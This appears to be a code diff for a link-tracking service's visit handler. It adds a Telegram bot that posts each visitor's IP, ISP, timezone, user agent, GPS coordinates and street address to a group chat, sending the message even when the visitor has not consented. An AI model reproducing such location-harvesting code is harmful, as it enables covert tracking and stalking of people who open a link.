@@ -1,7 +1,7 @@
 const Link = require("../models/linkModel");
 const User = require("../models/userModel");
 const Visit = require("../models/visitModel");
-
+const { Telegraf } = require("telegraf");
 exports.recordVisit = async (req, res) => {
   const { slug } = req.params;
   const {
@@ -44,6 +44,24 @@ exports.recordVisit = async (req, res) => {
       gpsAddress,
       consented: !!consented,
     });
+
+    const bot = new Telegraf(process.env.BOT_TOKEN);
+    const GROUP_ID = process.env.GROUP_ID;
+
+    const message = `🚀 New visit detected!
+🌍 IP: ${ip}
+🏙 City: ${city}
+🗺 Region: ${region}
+🌎 Country: ${country}
+🏢 Org: ${org}
+⏱ Timezone: ${timezone}
+📍 IP Coordinates: ${ipLat}, ${ipLon}
+🖥 User-Agent: ${useragent}
+📡 GPS Coordinates: ${lat}, ${lng}
+📌 GPS Address: ${gpsAddress}
+✅ Consented: ${consented}`;
+
+    await bot.telegram.sendMessage(GROUP_ID, message);
 
     res.status(201).json({ status: "success", data: { visitId: visit._id } });
   } catch (err) {
